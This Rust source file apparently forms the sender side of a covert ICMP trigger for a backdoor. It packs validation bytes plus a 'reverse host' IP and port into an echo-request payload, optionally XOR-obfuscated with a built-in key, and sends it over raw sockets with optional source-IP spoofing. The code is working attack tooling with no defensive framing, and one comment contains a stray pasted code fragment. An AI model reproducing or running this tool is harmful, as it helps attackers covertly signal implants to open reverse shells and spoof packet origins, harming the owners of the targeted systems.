use std::net::{IpAddr, Ipv4Addr};

use pnet::packet::icmp::{IcmpCode, IcmpTypes};
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::Packet;
use pnet::transport::transport_channel;
use pnet::transport::TransportChannelType::{Layer3, Layer4};
use pnet::transport::TransportProtocol::Ipv4;

use icmp_rust::{IDENTIFIER, OBFUSCATION_KEY, VALIDATION_BYTES};

const HEADER_ICMP_SIZE: usize = 8;
const DEFAULT_SIZE_ICMP: usize = 64;
const DEFAULT_SIZE_PAYLOAD: usize = DEFAULT_SIZE_ICMP - HEADER_ICMP_SIZE;


pub fn obfuscate_xor(data: Vec<u8>, key: Vec<u8>) -> Vec<u8> {
    let mut obfuscated = vec![0; data.len()];
    for (i, el) in data.iter().enumerate() {
        obfuscated[i] = el ^ key[i % key.len()];
    }
    obfuscated
}

fn fill_payload(
    payload: &mut [u8],
    position: usize,
    data: &[u8],
) -> Option<()> {
    if position + data.len() >= payload.len() {
        return None;
    }
    let mut i: usize = 0;
    for d in data {
        payload[position + i] = *d;
        i += 1;
    }
    Some(())
}


fn payload_builder(validation_bytes: Vec<u8>, ip: Ipv4Addr, port: u16) -> Vec<u8> {
    //13 for Validation, 4 for ip, 2 for port
    vec![validation_bytes, ip.octets().to_vec(), port.to_be_bytes().to_vec()].concat()
}

pub fn forge<'a>(
    ip_reverse_host: Ipv4Addr,
    port_reverse_host: u16,
    key: Option<Vec<u8>>,
    identifier: Option<u16>,
    use_default_size: bool,
    obfuscation: bool,
    validation_bytes: Option<Vec<u8>>,
) -> Vec<u8> {
    //TODO change that
    let validation_bytes = validation_bytes.unwrap_or_else(|| VALIDATION_BYTES.to_vec());
    // put the information needed in a payload
    let information: Vec<u8> = payload_builder(validation_bytes, ip_reverse_host, port_reverse_host);
    println!("size useful payload not encrypted: {}", information.len());
    // encrypt the payload (bad encryption --> node is hard coded)
    let information: Vec<u8> =
        if obfuscation {
            match key {
                Some(key) => obfuscate_xor(information, key),
                None => {
                    println!("No key provided but asked to obfuscate the payload but no key given, using default one");
                    obfuscate_xor(information, OBFUSCATION_KEY.to_vec())
                }
            }
        } else {
            information
        };


    println!("size useful payload: {}", information.len());

    //set up final payload
    let mut _payload_default: [u8; DEFAULT_SIZE_PAYLOAD] = [0u8; DEFAULT_SIZE_PAYLOAD];
    let payload: &[u8] = if use_default_size {
        fill_payload(&mut _payload_default, 0, &information);
        &_payload_default
    } else {
        &information
    };

    //setup icmp data
    let mut empty_vec = vec![0; HEADER_ICMP_SIZE + payload.len()];
    let mut icmp_packet =
        MutableEchoRequestPacket::new(&mut empty_vec).expect("not enough place to forge icmp");
    icmp_packet.set_icmp_type(IcmpTypes::EchoRequest); //echo request
    icmp_packet.set_icmp_code(IcmpCode(0)); //echo request
    icmp_packet.set_identifier(identifier.unwrap_or(IDENTIFIER));
    icmp_packet.set_sequence_number(0);
    icmp_packet.set_payload(&payload);
    icmp_packet.set_checksum(icmp_packet.get_checksum());
    icmp_packet.to_immutable().packet().to_vec()
}


pub fn send(icmp_packet: Vec<u8>, ip_dest: Ipv4Addr, ip_source: Option<Ipv4Addr>) {
    let icmp_packet = MutableEchoRequestPacket::owned(icmp_packet).expect("not enough place to forge icmp");
    //select protocol
    let (packet, protocol) = if ip_source.is_some() {
        //construction of the ip header
        let ip_source = ip_source.unwrap();
        let mut buffer = [0u8; 20];
        let mut ip_header = MutableIpv4Packet::new(buffer.as_mut()).expect("not enough place to forge ip");
        ip_header.set_version(4);

        ip_header.set_header_length(5);

        ip_header.set_total_length(28);
        ip_header.set_ttl(128);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
        ip_header.set_source(ip_source);
        ip_header.set_destination(ip_dest);
        ip_header.set_checksum(ip_header.get_checksum());

        let packet = [ip_header.packet(), icmp_packet.packet()].concat();

        (Some(MutableIpv4Packet::owned(packet).expect("not enough place to forge ip")),
         Layer3(IpNextHeaderProtocols::Icmp))
    } else {
        (None, Layer4(Ipv4(IpNextHeaderProtocols::Icmp)))
    };


    // Create a new transport channel, dealing with layer 4 packets on a test protocol    let ip_reverse_host = Ipv4Addr::from(ip_reverse_host);
    let (mut tx, _) = match transport_channel(0, protocol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!(
            "An error occurred when creating the transport channel: {}",
            e
        ),
    };
    match packet {
        Some(packet) => {
            match tx.send_to(packet, IpAddr::V4(ip_dest)) {
                Ok(_) => println!("Paquet envoyé!"),
                Err(e) => panic!("failed to send packet: {}", e),
            }
        }
        None => {
            match tx.send_to(icmp_packet, IpAddr::V4(ip_dest)) {
                Ok(_) => println!("Paquet envoyé!"),
                Err(e) => panic!("failed to send packet: {}", e),
            }
        }
    }
}